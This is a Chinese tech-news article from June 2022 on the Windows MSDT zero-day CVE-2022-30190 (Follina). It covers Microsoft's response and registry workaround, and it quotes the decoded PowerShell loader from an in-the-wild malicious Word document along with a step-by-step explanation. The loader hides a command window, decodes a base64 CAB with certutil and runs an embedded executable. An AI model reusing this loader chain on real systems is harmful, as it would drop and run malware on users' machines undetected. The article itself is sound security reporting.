
---
title: '专家发现高危代码执行零日漏洞 所有支持Windows版本均受影响'
categories: 
 - 新媒体
 - cnBeta
 - 最新
headimg: 'https://static.cnbetacdn.com/article/2022/0601/3192302de79f917.jpg'
author: cnBeta
comments: false
date: Wed, 01 Jun 2022 00:20:25 GMT
thumbnail: 'https://static.cnbetacdn.com/article/2022/0601/3192302de79f917.jpg'
---

<div>   
<strong>安全专家近日发现了高危的代码执行零日漏洞，目前所有支持的 Windows 系统均受影响。</strong>已经有相关证据表明至少在 7 周前就有黑客利用该漏洞，在不触发 Windows Defender 以及其他终端保护产品的情况下，在受害者设备上安装恶意程序。<br>
 <p style="text-align:center"><img src="https://static.cnbetacdn.com/article/2022/0601/3192302de79f917.jpg" alt="QQ截图20220601081912.jpg" referrerpolicy="no-referrer"></p><p style="text-align: left;">Shadow Chaser Group 的研究人员在 Twitter 上表示，这个存在于 Microsoft Support Diagnostic Tool 中的漏洞已经于 4 月 12 日报告给<a data-link="1" href="https://c.duomai.com/track.php?site_id=242986&euid=&t=https://www.microsoftstore.com.cn/" target="_blank">微软</a>，并已经证明该漏洞已经被黑客利用进行攻击。</p><p style="text-align: left;">不过给该研究人员的回复中，微软安全响应中心团队并未将报告的行为视为安全漏洞，因为据推测，MSDT 诊断工具在执行有效负载之前需要密码。</p><p style="text-align: left;">不过本周一，微软改变了口风，将该漏洞标识为 CVE-2022-30190，并将其描述为“关键”（critical）漏洞。</p><p style="text-align: left;">在公告中写道：“当从 Word 等调用应用程序使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。成功利用此漏洞的攻击者可以使用调用应用程序的权限运行任意代码。然后攻击者可以安装程序、查看、更改或删除数据，或者在用户权限允许的上下文中创建新帐户”。</p><p style="text-align: left;">在本文发表时，微软尚未发布补丁。相反，它建议客户通过以下方式禁用 MSDT URL 协议：</p><blockquote style="text-align: left;"><p style="text-align: left;">1. 以管理员身份运行命令提示符。</p><p style="text-align: left;">2. 要备份注册表项，请执行命令“reg export HKEY_CLASSES_ROOT\ms-msdt filename”</p><p style="text-align: left;">3. 执行命令“reg delete HKEY_CLASSES_ROOT\ms-msdt /f”</p></blockquote><p style="text-align: left;">虽然最初被微软遗漏了，但当研究人员发现周五上传到 VirusTotal 的 Word 文档利用了以前未知的攻击媒介时，该漏洞再次被发现。</p><p style="text-align: left;">根据研究员 Kevin Beaumont 的分析，该文档使用 Word 从远程 Web 服务器检索 HTML 文件。然后，该文档使用 MSProtocol URI 方案来加载和执行 PowerShell 命令。</p><p style="text-align: left;">虽然在理论上这不太可能实现，但事实上确实是可以的。当文档中的命令被解码时，它们会转换为：</p><blockquote style="text-align: left;"><p style="text-align: left;">$cmd ="c:\<a data-link="1" href="https://microsoft.pvxt.net/x9Vg1" target="_blank">Windows</a>\system32\cmd.exe";</p><p style="text-align: left;">Start-Process $cmd -windowstyle hidden -ArgumentList"/c taskkill /f /im msdt.exe";</p><p style="text-align: left;">Start-Process $cmd -windowstyle hidden -ArgumentList"/c cd C:\users\public\&&for /r</p><p style="text-align: left;">%temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";</p></blockquote><p style="text-align: left;">根据 Huntress 的解释，该脚本实现的操作为</p><blockquote style="text-align: left;"><p style="text-align: left;">在隐藏窗口运行以下操作</p><p style="text-align: left;">1. 如果 msdt.exe 正在运行，则终止它</p><p style="text-align: left;">2. 循环遍历 RAR 文件中的文件，查找编码 CAB 文件的 Base64 字符串</p><p style="text-align: left;">3. 将此 Base64 编码的 CAB 文件存储为 1.t</p><p style="text-align: left;">4. 解码Base64编码的CAB文件保存为1.c</p><p style="text-align: left;">5. 将1.c CAB文件展开到当前目录，最后：</p><p style="text-align: left;">6. 执行rgb.exe（大概压缩在1.c CAB文件里面）</p></blockquote>   
</div>
            